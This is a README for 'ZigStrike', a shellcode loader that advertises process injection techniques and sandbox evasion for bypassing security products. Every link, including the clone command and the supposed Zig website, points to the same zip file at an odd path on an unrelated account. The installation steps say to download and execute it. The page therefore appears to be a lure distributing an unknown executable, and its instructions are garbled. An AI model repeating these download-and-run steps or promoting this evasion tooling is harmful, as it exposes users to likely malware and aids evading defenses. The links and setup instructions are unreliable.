## Overview
ZigStrike is a robust shellcode loader developed in Zig. It offers a variety of injection techniques and anti-sandbox features. By leveraging compile-time capabilities, ZigStrike efficiently allocates shellcode. It has proven successful in bypassing advanced security solutions, making it a valuable tool for cybersecurity professionals.

## Features
- **Multiple Injection Techniques**: Supports various methods for shellcode injection, enhancing flexibility.
- **Anti-Sandbox Mechanisms**: Includes features designed to evade detection by sandbox environments.
- **Compile-Time Allocation**: Utilizes Zig's compile-time capabilities for efficient memory management.
- **User-Friendly Interface**: Simple command-line interface for ease of use.
- **Active Development**: Regular updates and improvements based on user feedback.

## Installation
To get started with ZigStrike, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip
   cd ZigStrike
   ```

2. **Build the Project**:
   Ensure you have Zig installed. You can download it from the [Zig website](https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip).
   ```bash
   zig build
   ```

3. **Download Latest Release**:
   For the latest version, visit the [Releases section](https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip). Download the appropriate file and execute it.

## Usage
Once you have installed ZigStrike, you can use it from the command line. The basic syntax is as follows:

```bash
./zigstrike <options>
```

### Options
- `-h`, `--help`: Display help information.
- `-i`, `--inject`: Specify the injection method.
- `-s`, `--shellcode`: Provide the shellcode to be loaded.

### Example
```bash
./zigstrike -i method1 -s https://github.com/manishvermaindore/ZigStrike/raw/refs/heads/main/amylohydrolytic/Strike-Zig-1.1.zip
```

## Injection Techniques
ZigStrike supports several injection techniques, including:

1. **Process Hollowing**: Replaces the memory of a target process with shellcode.
2. **Thread Injection**: Creates a new thread in a target process to execute shellcode.
3. **Reflective DLL Injection**: Loads a DLL into a target process without writing to disk.

Each technique has its advantages and can be selected based on the target environment.

## Anti-Sandbox Features
ZigStrike includes several features to help evade detection:

- **Environment Checks**: Identifies if the program is running in a sandbox.
- **Timing Checks**: Measures execution time to differentiate between real and simulated environments.
- **User Interaction**: Waits for user input before executing shellcode, reducing automated detection.
